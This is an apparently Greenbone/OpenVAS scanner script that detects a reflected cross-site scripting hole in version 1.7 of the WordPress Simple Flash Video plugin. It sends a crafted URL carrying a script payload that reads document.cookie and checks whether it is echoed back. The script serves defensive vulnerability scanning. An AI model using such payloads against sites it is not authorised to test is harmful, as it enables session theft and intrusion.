CPE = "cpe:/a:wordpress:wordpress";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.804026" );
	script_version( "$Revision: 11401 $" );
	script_tag( name: "cvss_base", value: "4.3" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:M/Au:N/C:N/I:P/A:N" );
	script_tag( name: "last_modification", value: "$Date: 2018-09-15 10:45:50 +0200 (Sat, 15 Sep 2018) $" );
	script_tag( name: "creation_date", value: "2013-10-16 11:45:51 +0530 (Wed, 16 Oct 2013)" );
	script_name( "WordPress Simple Flash Video Plugin Cross Site Scripting Vulnerability" );
	script_tag( name: "summary", value: "This host is installed with WordPress Simple Flash Video plugin and is prone
to cross site scripting vulnerability." );
	script_tag( name: "vuldetect", value: "Send a crafted HTTP GET request and check whether it is able to read the
cookie or not." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year
since the disclosure of this vulnerability. Likely none will be provided anymore.
General solution options are to upgrade to a newer release, disable respective
features, remove the product or replace the product by another one." );
	script_tag( name: "insight", value: "Input passed via the 'action' parameter to '/simple-flash-video/stats/index.php'
script is not properly sanitized before being returned to the user." );
	script_tag( name: "affected", value: "WordPress Simple Flash Video Plugin version 1.7, Other versions may also
be affected." );
	script_tag( name: "impact", value: "Successful exploitation will allow attacker to execute arbitrary HTML and
script code in a user's browser session in the context of an affected site." );
	script_tag( name: "solution_type", value: "WillNotFix" );
	script_xref( name: "URL", value: "http://hardeningsecurity.com/?p=2110" );
	script_xref( name: "URL", value: "http://packetstormsecurity.com/files/123562" );
	script_category( ACT_ATTACK );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_copyright( "Copyright (c) 2013 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "secpod_wordpress_detect_900182.sc" );
	script_mandatory_keys( "wordpress/installed" );
	script_require_ports( "Services/www", 80 );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("host_details.inc.sc");
if(!http_port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: http_port )){
	exit( 0 );
}
url = dir + "/wp-content/plugins/simple-flash-video/stats/?action=" + "\"/><script>alert(document.cookie)</script>";
if(http_vuln_check( port: http_port, url: url, check_header: TRUE, pattern: "<script>alert\\(document\\.cookie\\)</script>", extra_check: ">Simple Stats" )){
	security_message( port: http_port );
	exit( 0 );
}

